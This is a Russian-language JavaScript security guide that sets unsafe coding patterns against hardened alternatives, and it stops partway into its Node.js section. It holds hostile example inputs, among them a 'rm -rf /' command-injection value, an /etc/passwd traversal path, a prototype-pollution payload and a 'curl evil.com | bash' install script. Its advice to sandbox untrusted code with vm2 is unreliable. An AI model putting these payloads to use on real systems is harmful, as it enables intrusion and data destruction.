# JavaScript Security Guide — Полное руководство

> Версия 1.0 · 2026 · Охватывает браузер, Node.js и современные фреймворки

---

## Содержание

1. [XSS — Cross-Site Scripting](#1-xss)
2. [CSRF — Cross-Site Request Forgery](#2-csrf)
3. [Injection-атаки](#3-injection)
4. [Небезопасная десериализация](#4-deserializations)
5. [Prototype Pollution](#5-prototype-pollution)
6. [ReDoS — Regular Expression Denial of Service](#6-redos)
7. [Clickjacking](#7-clickjacking)
8. [Небезопасное хранение данных](#8-storage)
9. [Управление зависимостями и Supply Chain](#9-supply-chain)
10. [Content Security Policy (CSP)](#10-csp)
11. [HTTPS, HSTS и безопасные куки](#11-https-cookies)
12. [Аутентификация и авторизация](#12-auth)
13. [Криптография в JS](#13-crypto)
14. [Безопасность API и fetch](#14-api-security)
15. [Безопасность веб-воркеров и postMessage](#15-postmessage)
16. [Node.js — серверная безопасность](#16-nodejs)
17. [Безопасность npm и окружения](#17-npm)
18. [Таймингові атаки](#18-timing)
19. [Инструменты и автоматизация](#19-tools)
20. [Чеклист безопасности](#20-checklist)

---

## 1. XSS — Cross-Site Scripting

XSS — внедрение вредоносного скрипта в страницу, которую видят другие пользователи. Это **атака №1** в веб-разработке.

### Типы XSS

| Тип | Описание | Пример |
|-----|----------|--------|
| **Reflected** | Скрипт в URL, сразу отражается в ответе | `?q=<script>...` |
| **Stored** | Скрипт сохранён в БД, показывается всем | Комментарий с `<script>` |
| **DOM-based** | Скрипт через манипуляцию DOM без сервера | `location.hash` → `innerHTML` |
| **Mutation XSS (mXSS)** | Браузер «исправляет» HTML и создаёт вектор | Сложные вложения тегов |

---

### 1.1 Функция `esc()` — экранирование HTML

Основа XSS-защиты: **никогда не вставлять пользовательский ввод в HTML напрямую**.

```javascript
// ✅ Полная функция esc() для HTML-контекста
function esc(str) {
  if (str === null || str === undefined) return '';
  return String(str)
    .replace(/&/g,  '&amp;')   // ПЕРВЫМ — иначе двойное экранирование
    .replace(/</g,  '&lt;')
    .replace(/>/g,  '&gt;')
    .replace(/"/g,  '&quot;')
    .replace(/'/g,  '&#x27;')
    .replace(/\//g, '&#x2F;')  // закрывает </script> внутри атрибутов
    .replace(/`/g,  '&#x60;'); // закрывает template literals в атрибутах
}

// Использование
document.getElementById('output').innerHTML = esc(userInput);
```

> ⚠️ `esc()` работает **только для HTML-контекста**. Разные контексты требуют разного экранирования!

---

### 1.2 Контекстное экранирование

```javascript
// ── HTML-атрибут ───────────────────────────────────────────────────────────
// <div data-name="[USER INPUT]">
function escAttr(str) {
  return String(str ?? '').replace(/[^\w\s\-\.]/g, c =>
    `&#x${c.charCodeAt(0).toString(16).padStart(2,'0')};`
  );
}

// ── JavaScript-контекст ────────────────────────────────────────────────────
// var x = "[USER INPUT]";  — опасно! Лучше JSON.stringify
function escJS(str) {
  return JSON.stringify(String(str ?? '')); // включает кавычки
}
// <script>var name = <?= escJS($name) ?>;</script>

// ── URL-контекст ───────────────────────────────────────────────────────────
// href="[USER INPUT]"
function escURL(str) {
  try {
    const url = new URL(str);
    // Разрешаем только безопасные протоколы
    if (!['http:', 'https:', 'mailto:'].includes(url.protocol)) {
      return '#';
    }
    return encodeURI(url.toString());
  } catch {
    return '#'; // не URL — блокируем
  }
}

// ── CSS-контекст ───────────────────────────────────────────────────────────
// style="color: [USER INPUT]"
function escCSS(str) {
  // Разрешаем только безопасные CSS-значения
  return String(str ?? '').replace(/[^a-zA-Z0-9\s\-_#.,()%]/g, '');
}
```

---

### 1.3 Безопасные DOM-методы

```javascript
// ❌ ОПАСНО
element.innerHTML = userInput;
element.outerHTML = userInput;
document.write(userInput);
element.insertAdjacentHTML('beforeend', userInput);
eval(userInput);
setTimeout(userInput, 0);      // строка = eval!
new Function(userInput)();

// ✅ БЕЗОПАСНО
element.textContent = userInput;    // всегда текст, никогда HTML
element.setAttribute('data-x', userInput);
element.value = userInput;

// ✅ Безопасный innerHTML через DOMParser-санитизацию
function safeHTML(html) {
  const parser = new DOMParser();
  const doc = parser.parseFromString(html, 'text/html');
  // Удаляем все скрипты
  doc.querySelectorAll('script, object, embed, iframe, link[rel=import]')
     .forEach(el => el.remove());
  // Удаляем on* атрибуты
  doc.querySelectorAll('*').forEach(el => {
    [...el.attributes].forEach(attr => {
      if (attr.name.startsWith('on') || attr.value.startsWith('javascript:')) {
        el.removeAttribute(attr.name);
      }
    });
  });
  return doc.body.innerHTML;
}
```

---

### 1.4 DOMPurify — промышленная санитизация

```bash
npm install dompurify
```

```javascript
import DOMPurify from 'dompurify';

// Базовое использование
const clean = DOMPurify.sanitize(dirtyHTML);
element.innerHTML = clean;

// Строгий режим — только текст
const text = DOMPurify.sanitize(dirtyHTML, { ALLOWED_TAGS: [] });

// Разрешить только безопасные теги
const limited = DOMPurify.sanitize(dirtyHTML, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
  ALLOWED_ATTR: ['href', 'title', 'target'],
  ALLOW_DATA_ATTR: false,
  // Принудительно добавить rel="noopener" для всех ссылок
  ADD_ATTR: ['target'],
});

// Хук — дополнительная проверка URL
DOMPurify.addHook('afterSanitizeAttributes', node => {
  if ('href' in node) {
    const href = node.getAttribute('href') || '';
    if (!/^https?:\/\//i.test(href)) {
      node.setAttribute('href', '#');
    }
  }
});
```

---

### 1.5 Trusted Types API (современный браузерный стандарт)

```javascript
// Включается через CSP: require-trusted-types-for 'script'

if (window.trustedTypes && trustedTypes.createPolicy) {
  const policy = trustedTypes.createPolicy('myapp', {
    createHTML: (input) => DOMPurify.sanitize(input),
    createScriptURL: (input) => {
      // Разрешаем только свой CDN
      if (input.startsWith('https://cdn.myapp.com/')) return input;
      throw new Error('Недоверенный URL скрипта');
    },
    createScript: () => { throw new Error('eval запрещён'); }
  });

  // Использование
  element.innerHTML = policy.createHTML(userHTML);
  scriptEl.src = policy.createScriptURL(url);
}
```

---

## 2. CSRF — Cross-Site Request Forgery

Злоумышленник заставляет браузер жертвы отправить авторизованный запрос.

### 2.1 CSRF-токены

```javascript
// ── Сервер отдаёт токен в мета-теге ───────────────────────────────────────
// <meta name="csrf-token" content="abc123...">

// ── Клиент читает и отправляет с каждым запросом ──────────────────────────
const csrfToken = document.querySelector('meta[name="csrf-token"]')?.content;

// Fetch с CSRF-токеном
async function secureFetch(url, options = {}) {
  return fetch(url, {
    ...options,
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
      ...options.headers,
    },
    credentials: 'same-origin', // куки только для своего домена
  });
}

// Axios — глобальный перехватчик
axios.defaults.headers.common['X-CSRF-Token'] = csrfToken;
```

---

### 2.2 SameSite cookies

```javascript
// Node.js / Express
res.cookie('sessionId', token, {
  httpOnly: true,     // JS не может читать
  secure: true,       // только HTTPS
  sameSite: 'strict', // 'strict' | 'lax' | 'none'
  maxAge: 3600000,    // 1 час
  path: '/',
});

// SameSite=Strict — куки НЕ отправляются при переходе с другого сайта
// SameSite=Lax    — куки отправляются при safe-методах (GET)
// SameSite=None   — всегда, но требует Secure
```

---

### 2.3 Проверка Origin/Referer на сервере

```javascript
// Express middleware
function csrfOriginCheck(req, res, next) {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();

  const origin = req.headers.origin || req.headers.referer;
  const allowed = ['https://myapp.com', 'https://www.myapp.com'];

  if (!origin || !allowed.some(o => origin.startsWith(o))) {
    return res.status(403).json({ error: 'CSRF check failed' });
  }
  next();
}
```

---

## 3. Injection-атаки

### 3.1 SQL Injection (Node.js)

```javascript
// ❌ ОПАСНО — конкатенация
const query = `SELECT * FROM users WHERE name = '${userInput}'`;

// ✅ БЕЗОПАСНО — параметризованные запросы

// node-postgres (pg)
const { rows } = await client.query(
  'SELECT * FROM users WHERE name = $1 AND role = $2',
  [userName, userRole]
);

// mysql2
const [rows] = await connection.execute(
  'SELECT * FROM users WHERE name = ? AND age > ?',
  [userName, minAge]
);

// Knex.js — query builder
const users = await knex('users')
  .where({ name: userName, active: true })
  .select('id', 'email');

// Prisma — ORM с типобезопасностью
const user = await prisma.user.findFirst({
  where: { name: userName }
});
```

---

### 3.2 NoSQL Injection (MongoDB)

```javascript
// ❌ ОПАСНО
const user = await User.findOne({ name: req.body.name });
// Если req.body.name = { $gt: '' } — вернёт всех пользователей!

// ✅ БЕЗОПАСНО — валидация типа
function sanitizeMongoInput(input) {
  if (typeof input !== 'string') throw new Error('Invalid input type');
  // Удаляем MongoDB-операторы
  return input.replace(/\$|\./g, '');
}

// ✅ Или использовать mongoose с валидацией схемы
const UserSchema = new mongoose.Schema({
  name: { type: String, required: true, maxlength: 100 }
});

// ✅ express-mongo-sanitize
import mongoSanitize from 'express-mongo-sanitize';
app.use(mongoSanitize()); // удаляет $ и . из req.body, req.params, req.query
```

---

### 3.3 Command Injection (Node.js)

```javascript
import { execFile, spawn } from 'child_process';

// ❌ ОПАСНО
exec(`convert ${userFile} output.pdf`);
// Если userFile = "x; rm -rf /" — катастрофа

// ✅ execFile — без shell, аргументы отдельно
execFile('convert', [userFile, 'output.pdf'], (err, stdout) => {
  if (err) throw err;
  console.log(stdout);
});

// ✅ spawn — для потоков
const proc = spawn('ls', ['-la', '/safe/directory'], {
  shell: false, // КРИТИЧНО: отключить shell
});

// ✅ Валидация имён файлов
function validateFilename(name) {
  if (!/^[a-zA-Z0-9_\-\.]+$/.test(name)) {
    throw new Error('Invalid filename');
  }
  // Защита от path traversal
  const resolved = path.resolve('/uploads', name);
  if (!resolved.startsWith('/uploads/')) {
    throw new Error('Path traversal detected');
  }
  return resolved;
}
```

---

### 3.4 Path Traversal

```javascript
import path from 'path';
import fs from 'fs';

const BASE_DIR = '/app/uploads';

// ❌ ОПАСНО
app.get('/file', (req, res) => {
  res.sendFile(req.query.name); // ../../../../etc/passwd
});

// ✅ БЕЗОПАСНО
app.get('/file', (req, res) => {
  const filename = path.basename(req.query.name); // только имя файла
  const fullPath = path.resolve(BASE_DIR, filename);

  // Двойная проверка — resolve может обойти basename
  if (!fullPath.startsWith(BASE_DIR + path.sep)) {
    return res.status(403).send('Forbidden');
  }

  if (!fs.existsSync(fullPath)) {
    return res.status(404).send('Not found');
  }

  res.sendFile(fullPath);
});
```

---

## 4. Небезопасная десериализация

### 4.1 JSON.parse — безопасная десериализация

```javascript
// ✅ JSON.parse — безопасен сам по себе (не выполняет код)
// Но нужна валидация схемы!

// Без валидации — опасно для бизнес-логики
const data = JSON.parse(userInput); // может содержать неожиданные поля

// ✅ С валидацией через Zod
import { z } from 'zod';

const UserSchema = z.object({
  id: z.number().int().positive(),
  name: z.string().min(1).max(100),
  role: z.enum(['user', 'admin']),
  email: z.string().email(),
});

function parseUser(raw) {
  const data = JSON.parse(raw);
  return UserSchema.parse(data); // бросает ZodError при несоответствии
}

// ✅ С reviver — контроль типов при парсинге
const data = JSON.parse(raw, (key, value) => {
  // Блокируем __proto__, constructor, prototype
  if (['__proto__', 'constructor', 'prototype'].includes(key)) {
    return undefined;
  }
  return value;
});
```

---

### 4.2 eval и опасные функции

```javascript
// ❌ НИКОГДА не использовать с пользовательским вводом
eval(userCode);
new Function(userCode)();
setTimeout(userString, 0);
setInterval(userString, 0);
document.write(userHTML);

// ❌ Замаскированный eval
window['eval'](code);
(0, eval)(code);
globalThis['Function'](code)();

// ✅ Если нужен sandbox — используйте iframe с sandbox-атрибутом
const iframe = document.createElement('iframe');
iframe.sandbox = 'allow-scripts'; // без allow-same-origin!
iframe.srcdoc = `<script>${trustedCode}</script>`;
document.body.appendChild(iframe);

// ✅ Для Node.js — vm2 или isolated-vm
import { VM } from 'vm2';
const vm = new VM({ timeout: 1000, sandbox: { console } });
const result = vm.run(untrustedCode);
```

---

## 5. Prototype Pollution

Атака на `Object.prototype` — может изменить поведение всего приложения.

```javascript
// Как выглядит атака
const payload = JSON.parse('{"__proto__": {"isAdmin": true}}');
Object.assign({}, payload);
// Теперь ({}).isAdmin === true для ВСЕХ объектов!

// ── Защита #1: Object.create(null) ────────────────────────────────────────
const safeObj = Object.create(null); // нет прототипа
safeObj['__proto__'] = 'attack'; // просто строка, не прототип

// ── Защита #2: Проверка ключей ─────────────────────────────────────────────
function safeSet(obj, key, value) {
  const forbidden = ['__proto__', 'constructor', 'prototype'];
  if (forbidden.includes(key)) {
    throw new Error(`Forbidden key: ${key}`);
  }
  obj[key] = value;
}

// ── Защита #3: Object.freeze ──────────────────────────────────────────────
Object.freeze(Object.prototype);
// Теперь изменение __proto__ бросит ошибку в strict mode

// ── Защита #4: hasOwnProperty при итерации ────────────────────────────────
function mergeDeep(target, source) {
  for (const key of Object.keys(source)) { // Object.keys, не for..in
    if (key === '__proto__' || key === 'constructor') continue;
    if (typeof source[key] === 'object' && source[key] !== null) {
      target[key] = mergeDeep(target[key] ?? {}, source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// ── Защита #5: Map вместо объектов для динамических ключей ────────────────
const store = new Map(); // прототипа нет, __proto__ — просто ключ
store.set(userKey, value);
```

---

## 6. ReDoS — Regular Expression Denial of Service

Злые регулярки могут «зависнуть» на экспоненциальное время.

```javascript
// ❌ Уязвимые паттерны (катастрофический backtracking)
/^(a+)+$/.test('aaaaaaaaaaaaaaaaaaaX');       // ~2^n шагов
/(a|aa)+/.test('aaaaaaaaaaaaaaaaaaaaX');
/(\w+\s?)*$/.test('aaaa...X');

// ✅ Атомарные группы (ES2025) и possessive quantifiers
// Пока не везде поддерживается, поэтому:

// ✅ Использовать конкретные ограничения
/^[a-z]{1,50}$/.test(input);    // длина ограничена
/^\d{1,10}$/.test(input);       // только цифры

// ✅ Таймаут для опасных регулярок (Node.js)
const { Worker } = require('worker_threads');

function safeRegex(pattern, input, timeoutMs = 100) {
  return new Promise((resolve, reject) => {
    const worker = new Worker(`
      const { parentPort, workerData } = require('worker_threads');
      const { pattern, input } = workerData;
      parentPort.postMessage(new RegExp(pattern).test(input));
    `, { eval: true, workerData: { pattern, input } });

    const timer = setTimeout(() => {
      worker.terminate();
      reject(new Error('Regex timeout — возможный ReDoS'));
    }, timeoutMs);

    worker.on('message', result => {
      clearTimeout(timer);
      resolve(result);
    });
  });
}

// ✅ Библиотека safe-regex для проверки
import safeRegex from 'safe-regex';
if (!safeRegex(/^(a+)+$/)) {
  console.warn('Небезопасная регулярка!');
}
```

---

## 7. Clickjacking

Атака скрывает страницу за прозрачным iframe, перехватывая клики.

```javascript
// ── Защита на сервере — заголовки ─────────────────────────────────────────
// X-Frame-Options: DENY                 — запретить все фреймы
// X-Frame-Options: SAMEORIGIN           — разрешить только свой домен
// Content-Security-Policy: frame-ancestors 'none'  — современный способ

// Express
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('Content-Security-Policy', "frame-ancestors 'none'");
  next();
});

// ── Frame-busting (JS — устаревший метод, лучше заголовки) ────────────────
if (window.top !== window.self) {
  window.top.location = window.self.location;
}

// ── Современная защита: CSP frame-ancestors ───────────────────────────────
// Более надёжна, чем X-Frame-Options для современных браузеров
// Content-Security-Policy: frame-ancestors 'self' https://trusted.com
```

---

## 8. Небезопасное хранение данных

### 8.1 localStorage / sessionStorage

```javascript
// ❌ НЕ хранить в localStorage
localStorage.setItem('authToken', jwtToken);     // XSS крадёт токен
localStorage.setItem('password', userPassword);  // никогда!
localStorage.setItem('creditCard', '4111...');   // критические данные

// ✅ Хранить в httpOnly-куках (недоступны JS)
// Сервер устанавливает: Set-Cookie: token=abc; HttpOnly; Secure; SameSite=Strict

// ✅ Если нужно хранить в localStorage — шифровать
import { AES, enc } from 'crypto-js';

const SECRET = 'app-secret-key'; // в реальности — генерировать динамически

function secureStore(key, value) {
  const encrypted = AES.encrypt(JSON.stringify(value), SECRET).toString();
  localStorage.setItem(key, encrypted);
}

function secureRead(key) {
  const encrypted = localStorage.getItem(key);
  if (!encrypted) return null;
  const bytes = AES.decrypt(encrypted, SECRET);
  return JSON.parse(bytes.toString(enc.Utf8));
}

// ✅ Очищать при выходе
function logout() {
  localStorage.clear();
  sessionStorage.clear();
  // Инвалидировать токен на сервере
  fetch('/api/logout', { method: 'POST', credentials: 'include' });
}
```

---

### 8.2 IndexedDB — шифрование

```javascript
// Для чувствительных данных в IndexedDB используйте Web Crypto API
async function encryptData(data, key) {
  const encoder = new TextEncoder();
  const iv = crypto.getRandomValues(new Uint8Array(12));
  const encrypted = await crypto.subtle.encrypt(
    { name: 'AES-GCM', iv },
    key,
    encoder.encode(JSON.stringify(data))
  );
  return { iv: Array.from(iv), data: Array.from(new Uint8Array(encrypted)) };
}
```

---

## 9. Supply Chain — безопасность зависимостей

### 9.1 npm audit и lockfile

```bash
# Проверка уязвимостей
npm audit
npm audit --audit-level=high   # только высокие и критические
npm audit fix                   # автоисправление
npm audit fix --force           # форсированное (осторожно!)

# Обновление зависимостей
npx npm-check-updates -u        # обновить package.json
npm install

# Проверка целостности
npm ci                          # использует package-lock.json строго
```

---

### 9.2 Проверка пакетов перед установкой

```bash
# Просмотр содержимого пакета
npm pack <package> --dry-run
npx npm-explorer <package>

# Скрипты из package.json — опасны!
# "preinstall": "curl evil.com | bash"
npm install --ignore-scripts   # отключить preinstall/postinstall

# Socket.dev — анализ пакетов на угрозы
npx @socketsecurity/cli@latest info <package>
```

---

### 9.3 package.json — ограничения

```json
{
  "scripts": {
    "preinstall": "node scripts/check-env.js"
  },
  "engines": {
    "node": ">=18.0.0",
    "npm": ">=9.0.0"
  },
  "overrides": {
    "vulnerable-package": ">=2.1.0"
  }
}
```

```javascript
// .npmrc — безопасные настройки
// ignore-scripts=true          ← отключить install-скрипты
// audit=true                   ← автоаудит
// save-exact=true              ← точные версии (no ^ or ~)
// registry=https://registry.npmjs.org/
```

---

### 9.4 Subresource Integrity (SRI)

```html
<!-- Для CDN-скриптов — всегда использовать integrity -->
<script
  src="https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js"
  integrity="sha256-qXBd/EfAdjOA2FGrGAG+b3YBn2tn5A6bhz+LSgYD96k="
  crossorigin="anonymous">
</script>

<!-- Генерация хеша -->
<!-- openssl dgst -sha256 -binary file.js | openssl base64 -A -->
```

```javascript
// Автоматическая генерация SRI-хешей в Node.js
import crypto from 'crypto';
import fs from 'fs';

function generateSRI(filePath) {
  const content = fs.readFileSync(filePath);
  const hash = crypto.createHash('sha256').update(content).digest('base64');
  return `sha256-${hash}`;
}
```

---

## 10. Content Security Policy (CSP)

CSP — мощный механизм, ограничивающий источники ресурсов.

```javascript
// Express — продвинутый CSP через helmet
import helmet from 'helmet';

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: [
      "'self'",
      // НЕ использовать 'unsafe-inline' и 'unsafe-eval'!
      // Для нужных inline-скриптов — nonce
      (req, res) => `'nonce-${res.locals.nonce}'`,
    ],
    styleSrc: ["'self'", "'unsafe-inline'"], // инлайн-стили — компромисс
    imgSrc: ["'self'", 'data:', 'https://images.myapp.com'],
    connectSrc: ["'self'", 'https://api.myapp.com', 'wss://ws.myapp.com'],
    fontSrc: ["'self'", 'https://fonts.gstatic.com'],
    objectSrc: ["'none'"],           // запретить Flash/PDF плагины
    mediaSrc: ["'self'"],
    frameSrc: ["'none'"],            // запретить iframes
    workerSrc: ["'self'", 'blob:'],
    manifestSrc: ["'self'"],
    baseUri: ["'self'"],             // защита от base-tag injection
    formAction: ["'self'"],          // куда можно отправлять формы
    upgradeInsecureRequests: [],     // HTTP → HTTPS автоматически
    reportUri: '/api/csp-report',    // получать отчёты о нарушениях
  },
  reportOnly: false, // true = только логировать, не блокировать
}));

// Генерация nonce для каждого запроса
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  next();
});
```

```html
<!-- Использование nonce в HTML -->
<script nonce="<%= nonce %>">
  // Этот скрипт разрешён
  const app = initApp();
</script>
```

---

## 11. HTTPS, HSTS и безопасные куки

```javascript
// Express — HTTPS redirect + HSTS
app.use((req, res, next) => {
  if (req.header('x-forwarded-proto') !== 'https') {
    return res.redirect(301, `https://${req.header('host')}${req.url}`);
  }
  next();
});

app.use(helmet.hsts({
  maxAge: 31536000,           // 1 год (рекомендовано)
  includeSubDomains: true,    // все поддомены
  preload: true,              // для HSTS preload list
}));

// Безопасные куки — полный набор флагов
const cookieOptions = {
  httpOnly: true,       // JS не может читать
  secure: true,         // только HTTPS
  sameSite: 'strict',   // CSRF-защита
  maxAge: 3600000,      // 1 час
  domain: '.myapp.com', // только этот домен
  path: '/',
  signed: true,         // подпись через cookieParser(secret)
};

res.cookie('sessionId', generateSessionId(), cookieOptions);

// Проверка подписанных кук
app.use(cookieParser(process.env.COOKIE_SECRET));
app.get('/profile', (req, res) => {
  const sessionId = req.signedCookies.sessionId; // проверено!
});
```

---

## 12. Аутентификация и авторизация

### 12.1 JWT — безопасное использование

```javascript
import jwt from 'jsonwebtoken';

const JWT_SECRET = process.env.JWT_SECRET; // минимум 256 бит
const JWT_OPTIONS = {
  algorithm: 'HS256',       // или RS256 для публичного ключа
  expiresIn: '15m',         // короткий срок жизни!
  issuer: 'myapp.com',
  audience: 'myapp-users',
};

// Создание токена
function createTokens(userId, role) {
  const accessToken = jwt.sign(
    { sub: userId, role, type: 'access' },
    JWT_SECRET,
    JWT_OPTIONS
  );

  const refreshToken = jwt.sign(
    { sub: userId, type: 'refresh' },
    process.env.REFRESH_SECRET,
    { expiresIn: '7d' }
  );

  return { accessToken, refreshToken };
}

// Верификация
function verifyToken(token) {
  try {
    return jwt.verify(token, JWT_SECRET, {
      algorithms: ['HS256'], // КРИТИЧНО: указывать алгоритм явно
      issuer: 'myapp.com',   // иначе alg:none атака!
      audience: 'myapp-users',
    });
  } catch (err) {
    throw new Error('Invalid token');
  }
}

// ❌ НЕ хранить JWT в localStorage (XSS)
// ✅ Хранить accessToken в памяти, refreshToken в httpOnly-куке
let accessToken = null; // в памяти — живёт до перезагрузки

async function refreshAccessToken() {
  const res = await fetch('/api/refresh', {
    method: 'POST',
    credentials: 'include', // отправит httpOnly refresh cookie
  });
  const { accessToken: newToken } = await res.json();
  accessToken = newToken;
  return newToken;
}
```

---

### 12.2 Хеширование паролей

```javascript
import bcrypt from 'bcrypt';
import argon2 from 'argon2';

// bcrypt — проверенный стандарт
const SALT_ROUNDS = 12; // минимум 10, рекомендуется 12-14

async function hashPassword(password) {
  // Валидация перед хешированием
  if (password.length > 72) {
    throw new Error('Password too long for bcrypt');
  }
  return bcrypt.hash(password, SALT_ROUNDS);
}

async function verifyPassword(password, hash) {
  return bcrypt.compare(password, hash); // таймингово-безопасно
}

// argon2 — современный, рекомендуется OWASP
async function hashPasswordArgon2(password) {
  return argon2.hash(password, {
    type: argon2.argon2id,     // защита от side-channel и GPU
    memoryCost: 65536,         // 64MB
    timeCost: 3,               // итерации
    parallelism: 4,
  });
}

// ❌ НЕ использовать для паролей
// MD5, SHA1, SHA256 — быстрые, брутфорс-уязвимы
// crypto.createHash('sha256').update(password).digest('hex')
```

---

### 12.3 Rate Limiting и защита от брутфорса

```javascript
import rateLimit from 'express-rate-limit';
import slowDown from 'express-slow-down';

// Общий rate limit
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 минут
  max: 100,                  // запросов на IP
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Too many requests, please try again later' },
});

// Строгий лимит для авторизации
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,                    // 5 попыток входа
  skipSuccessfulRequests: true,
});

// Постепенное замедление
const speedLimiter = slowDown({
  windowMs: 15 * 60 * 1000,
  delayAfter: 3,             // после 3 запросов
  delayMs: (hits) => hits * 200, // +200ms за каждый
});

app.use('/api/', limiter);
app.post('/api/login', speedLimiter, authLimiter, loginHandler);
```

---

## 13. Криптография в JS

### 13.1 Web Crypto API — стандарт браузера

```javascript
// ── Генерация случайных данных ────────────────────────────────────────────
const randomBytes = crypto.getRandomValues(new Uint8Array(32));
const randomToken = Array.from(randomBytes, b => b.toString(16).padStart(2,'0')).join('');

// ── Хеширование ───────────────────────────────────────────────────────────
async function sha256(message) {
  const encoder = new TextEncoder();
  const data = encoder.encode(message);
  const hash = await crypto.subtle.digest('SHA-256', data);
  return Array.from(new Uint8Array(hash))
    .map(b => b.toString(16).padStart(2, '0'))
    .join('');
}

// ── AES-GCM шифрование ───────────────────────────────────────────────────
async function generateAESKey() {
  return crypto.subtle.generateKey(
    { name: 'AES-GCM', length: 256 },
    true,   // extractable
    ['encrypt', 'decrypt']
  );
}

async function encrypt(plaintext, key) {
  const iv = crypto.getRandomValues(new Uint8Array(12)); // 96-bit IV
  const encoder = new TextEncoder();
  const ciphertext = await crypto.subtle.encrypt(
    { name: 'AES-GCM', iv },
    key,
    encoder.encode(plaintext)
  );
  // Префиксируем IV к шифртексту
  const result = new Uint8Array(iv.length + ciphertext.byteLength);
  result.set(iv, 0);
  result.set(new Uint8Array(ciphertext), iv.length);
  return btoa(String.fromCharCode(...result));
}

async function decrypt(cipherBase64, key) {
  const data = Uint8Array.from(atob(cipherBase64), c => c.charCodeAt(0));
  const iv = data.slice(0, 12);
  const ciphertext = data.slice(12);
  const plaintext = await crypto.subtle.decrypt(
    { name: 'AES-GCM', iv },
    key,
    ciphertext
  );
  return new TextDecoder().decode(plaintext);
}

// ── ECDH — обмен ключами ─────────────────────────────────────────────────
async function generateECDHKeyPair() {
  return crypto.subtle.generateKey(
    { name: 'ECDH', namedCurve: 'P-256' },
    false, // private key не экспортируется
    ['deriveKey']
  );
}

// ── Таймингово-безопасное сравнение ──────────────────────────────────────
async function timingSafeEqual(a, b) {
  const encoder = new TextEncoder();
  const [keyA, keyB] = await Promise.all([
    crypto.subtle.importKey('raw', encoder.encode(a), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']),
    crypto.subtle.importKey('raw', encoder.encode(b), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']),
  ]);
  const data = encoder.encode('comparison');
  const [sigA, sigB] = await Promise.all([
    crypto.subtle.sign('HMAC', keyA, data),
    crypto.subtle.sign('HMAC', keyB, data),
  ]);
  // Сравниваем через XOR всех байт
  const arrA = new Uint8Array(sigA);
  const arrB = new Uint8Array(sigB);
  let diff = 0;
  for (let i = 0; i < arrA.length; i++) diff |= arrA[i] ^ arrB[i];
  return diff === 0;
}

// Node.js — встроенное безопасное сравнение
import crypto from 'crypto';
const isEqual = crypto.timingSafeEqual(
  Buffer.from(tokenA),
  Buffer.from(tokenB)
);
```

---

## 14. Безопасность API и fetch

```javascript
// ── Безопасный fetch wrapper ──────────────────────────────────────────────
const API_BASE = 'https://api.myapp.com';
const MAX_RESPONSE_SIZE = 10 * 1024 * 1024; // 10MB

async function apiFetch(endpoint, options = {}) {
  // Валидация endpoint — только относительные пути
  if (!endpoint.startsWith('/') || endpoint.includes('..')) {
    throw new Error('Invalid endpoint');
  }

  const url = `${API_BASE}${endpoint}`;
  const token = await getAccessToken(); // refresh если нужно

  const response = await fetch(url, {
    ...options,
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${token}`,
      'X-Request-ID': crypto.randomUUID(),  // для трассировки
      ...options.headers,
    },
    credentials: 'same-origin',
    signal: AbortSignal.timeout(10000), // 10 сек таймаут
  });

  // Проверка размера ответа
  const contentLength = response.headers.get('content-length');
  if (contentLength && parseInt(contentLength) > MAX_RESPONSE_SIZE) {
    throw new Error('Response too large');
  }

  if (!response.ok) {
    const error = await response.json().catch(() => ({}));
    throw new APIError(response.status, error.message);
  }

  // Проверяем Content-Type
  const contentType = response.headers.get('content-type');
  if (!contentType?.includes('application/json')) {
    throw new Error('Unexpected response type');
  }

  return response.json();
}

// ── CORS — настройка сервера ──────────────────────────────────────────────
import cors from 'cors';

const corsOptions = {
  origin: (origin, callback) => {
    const allowedOrigins = ['https://myapp.com', 'https://www.myapp.com'];
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token'],
  credentials: true,         // разрешить куки
  maxAge: 86400,             // preflight кеш 24 часа
  optionsSuccessStatus: 204,
};

app.use(cors(corsOptions));
```

---

## 15. Безопасность postMessage и Web Workers

```javascript
// ── postMessage — всегда проверять origin ─────────────────────────────────
window.addEventListener('message', (event) => {
  // ❌ НЕ проверять: event.origin === '*'
  // ✅ Явная проверка
  const TRUSTED_ORIGINS = ['https://myapp.com', 'https://widget.myapp.com'];

  if (!TRUSTED_ORIGINS.includes(event.origin)) {
    console.warn('Сообщение от ненадёжного origin:', event.origin);
    return;
  }

  // Валидация структуры данных
  const { type, payload } = event.data || {};
  if (typeof type !== 'string' || !type.match(/^[a-zA-Z_]+$/)) {
    return;
  }

  switch (type) {
    case 'UPDATE_CART':
      // Обрабатываем только ожидаемые типы
      handleCartUpdate(payload);
      break;
    default:
      console.warn('Неизвестный тип сообщения:', type);
  }
});

// ── Отправка сообщений — всегда указывать targetOrigin ────────────────────
// ❌ ОПАСНО
iframe.contentWindow.postMessage(data, '*');

// ✅ БЕЗОПАСНО
iframe.contentWindow.postMessage(data, 'https://trusted.com');

// ── Web Workers — изоляция опасного кода ─────────────────────────────────
const worker = new Worker('/workers/processor.js');

// В воркере нет доступа к DOM, window, document
// Но есть доступ к fetch — валидируйте данные!

// processor.js (Worker)
self.addEventListener('message', async (e) => {
  const { data, type } = e.data;
  
  // Валидация входных данных
  if (!isValidInput(data)) {
    self.postMessage({ error: 'Invalid input' });
    return;
  }

  const result = await processData(data);
  self.postMessage({ result });
});
```

---

## 16. Node.js — серверная безопасность

```javascript
// ── Helmet — набор security-заголовков ───────────────────────────────────
import helmet from 'helmet';

